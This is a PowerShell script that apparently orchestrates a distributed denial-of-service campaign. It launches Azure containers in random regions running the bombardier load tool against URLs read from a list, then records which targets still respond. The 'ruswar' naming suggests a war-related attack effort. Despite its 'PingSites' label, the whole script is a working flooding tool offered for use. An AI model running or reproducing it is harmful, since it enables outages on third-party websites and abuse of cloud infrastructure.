param(
    [Alias('Source')][string] $LinesPath = "./lines.txt",
    [Alias('Destination')][string] $TargetUrlsPath = "./urls.txt",
    [int] $AgentCount = 100,
    [string] $ExecutionTime = "60s",
    [string] $HttpMethod = 'http1',
    [int] $FinishTimeout = 100
)

.\Log "==== Start PingSites ===="

if (Test-Path $TargetUrlsPath) {
    .\Log -s 'ParseLine' "Remove old urls file: $TargetUrlsPath"
    Remove-Item $TargetUrlsPath
}

$lines = [System.IO.File]::ReadLines($LinesPath)

$location = .\GetRandomLocation

$resourceGroup = "rg-rw-ping-2-$(Get-Date -Format "MM-dd")"
az group create --location $location --name $resourceGroup

$id = 1
$containerUrlMap = @{}

ForEach ($line in $lines)
{
    if ([string]::IsNullOrWhiteSpace($line)) {
        .\Log -l DBG -s 'PingSites' "Ignore empty line"
        continue 
    }


    $urls = .\ParseLine $line 
    ForEach ($url in $urls) {
        $id++
        
        $name = "ruswar" + $i++
        $location = .\GetRandomLocation

        .\Log -s 'PingSites' "ResouceGroup: ${resourceGroup} Container: ${name} location: ${location} url: ${url}";

        az container create --resource-group $resourceGroup --name $name --image alpine/bombardier:latest --restart-policy OnFailure --command-line "/gopath/bin/bombardier -c ${$AgentCount} -d ${ExecutionTime} --${HttpMethod} -l ${url}" --location $location
    
        $containerUrlMap.Add($name, $url)

        .\Log -l DBG -s 'PingSites' "Add to dictionary: ${name}: ${url}"
    }
}

.\Log -s 'PingSites' "Waiting $FinishTimeout sec for all containers to finish.";
        
Start-Sleep -Seconds $FinishTimeout

# Collect & Analyze Logs
ForEach ($key in $containerUrlMap.keys) {
    $url = $containerUrlMap[$key]
    .\Log -s 'PingSites' "ResouceGroup: ${resourceGroup} Container: ${key} url: ${url}";

    $logs = az container logs --resource-group $resourceGroup --name $key
    .\Log -s 'PingSites' "Output for container: ${key}, url: ${url}"
    .\Log $logs

    # Filter out unsuccessful 
    if ($logs -Contains "1xx - 0, 2xx - 0, 3xx - 0, 4xx - 0, 5xx - 0") {
        .\Log -s 'PingSites' "Ping ${url}. Result: FAIL"
    }
    else {
        .\Log -s 'PingSites' "Ping ${url}. Result: SUCCESS"
        if (!(Test-Path $TargetUrlsPath)) {
            New-Item -Path $TargetUrlsPath -ItemType "file"
        }

        Add-content $TargetUrlsPath -value ${url}
    }
}

az group delete --resource-group $resourceGroup --yes
.\Log -s 'PingSites' "Deleted resource group ${resourceGroup}";

.\Log "==== Finish PingSites ===="
[console]::beep(500,1000)